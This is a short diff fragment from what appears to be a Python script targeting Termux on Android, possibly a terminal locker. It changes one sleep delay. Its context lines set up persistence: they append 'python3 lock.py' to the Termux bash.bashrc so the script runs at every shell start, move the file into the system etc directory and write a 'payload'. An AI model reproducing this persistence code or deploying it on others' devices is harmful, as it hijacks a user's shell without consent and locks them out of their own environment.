@@ -106,7 +106,7 @@ while True:
 		os.system('echo python3 lock.py >> /data/data/com.termux/files/usr/etc/bash.bashrc')
 		time.sleep(.1)
 		os.system('mv lock.py /data/data/com.termux/files/usr/etc/')
-		time.sleep(.1)
+		time.sleep(5)
 		o.write(payload)
 		os.system('mv lock.py /data/data/com.termux/files/home/')
 		
